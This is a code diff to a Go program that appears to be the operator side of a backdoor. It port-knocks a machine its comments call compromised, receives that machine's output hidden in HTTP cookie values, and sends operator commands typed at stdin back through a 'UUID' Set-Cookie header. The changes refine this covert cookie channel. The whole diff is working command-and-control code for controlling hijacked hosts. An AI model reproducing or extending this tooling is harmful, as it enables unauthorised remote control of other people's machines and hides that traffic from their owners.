@@ -6,6 +6,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"strings"
 	"time"
 )
 
@@ -29,7 +30,7 @@ func main() {
 
 	//execute port knocking on comprmised machine
 	portKnock(ipAddressOfCompremisedMachine, port1OfCompremisedMachine, port2OfCompremisedMachine, port3OfCompremisedMachine)
-	go waitForConnection()
+	go waitForConnection(c)
 
 	go handleResponse(c.responses)
 
@@ -71,23 +72,26 @@ func waitForConnection(c cookieHandler) {
 	//http.ListenAndServe(":8000", nil)
 }
 
-func (c *cookieHandler) ServeHTTP(writer http.ResponseWriter, request *http.Request) {
+func (c cookieHandler) ServeHTTP(writer http.ResponseWriter, request *http.Request) {
 
-	cookie, err := request.Cookie("UUID")
-	if err != nil {
-		println(err.Error())
+	cookies := request.Cookies()
+
+	for _, myCookie := range cookies {
+
+		c.responses <- myCookie.Value
 	}
-	println(cookie.String())
-	c.responses <- cookie.String()
 
 	var myCookie http.Cookie
-	myCookie.Name = "UUID"
-	myCookie.Value = <-c.commands
-	myCookie.MaxAge = -1
-	myCookie.Secure = false
-	myCookie.HttpOnly = false
+	select {
+	case myCookie.Value = <-c.commands:
+		myCookie.Name = "UUID"
+		myCookie.MaxAge = 50
+		myCookie.Secure = false
+		myCookie.HttpOnly = false
+		writer.Header().Set("Set-Cookie", myCookie.String())
+	default:
 
-	writer.Header().Set("Set-Cookie", myCookie.String())
+	}
 
 	io.WriteString(writer, "Hello world!")
 }
@@ -105,13 +109,14 @@ func acceptCommandFromStdin(acceptedCommand chan string) {
 			panic(err)
 		}
 
-		acceptedCommand <- string(line)
+		acceptedCommand <- strings.TrimSpace(string(line))
 
 	}
 }
 
 func handleResponse(channelResponses chan string) {
 	for {
+
 		println(<-channelResponses)
 	}
 
